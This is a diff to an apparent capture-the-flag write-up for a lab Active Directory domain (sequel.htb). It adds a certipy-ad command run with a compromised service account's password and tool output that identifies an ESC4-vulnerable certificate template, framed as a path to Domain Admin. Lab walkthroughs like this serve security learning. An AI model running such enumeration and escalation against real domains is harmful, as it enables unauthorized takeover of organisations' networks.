@@ -509,9 +509,56 @@ SMB         10.129.232.128  445    DC01             [+] sequel.htb\ca_svc:Passwo
 
 I now have compromised the `ca_svc` account
 
-# ADCS
+# ADCS -> Domain Admin
 
 ```python
 certipy-ad find -u ca_svc@sequel.htb -p 'Password123!' -stdout -target 'dc01.sequel.htb' -vulnerable
+```
+
+```python
+    Template Name                       : DunderMifflinAuthentication
+    Display Name                        : Dunder Mifflin Authentication
+    Certificate Authorities             : sequel-DC01-CA
+    Enabled                             : True
+    Client Authentication               : True
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : False
+    Certificate Name Flag               : SubjectAltRequireDns
+                                          SubjectRequireCommonName
+    Enrollment Flag                     : PublishToDs
+                                          AutoEnrollment
+    Extended Key Usage                  : Client Authentication
+                                          Server Authentication
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Schema Version                      : 2
+    Validity Period                     : 1000 years
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Template Created                    : 2026-07-23T20:13:28+00:00
+    Template Last Modified              : 2026-07-23T20:13:28+00:00
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+      Object Control Permissions
+        Owner                           : SEQUEL.HTB\Enterprise Admins
+        Full Control Principals         : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+                                          SEQUEL.HTB\Cert Publishers
+        Write Owner Principals          : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+                                          SEQUEL.HTB\Cert Publishers
+        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+                                          SEQUEL.HTB\Cert Publishers
+        Write Property Enroll           : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+    [+] User Enrollable Principals      : SEQUEL.HTB\Cert Publishers
+    [+] User ACL Principals             : SEQUEL.HTB\Cert Publishers
+    [!] Vulnerabilities
+      ESC4                              : User has dangerous permissions.
 ```
 
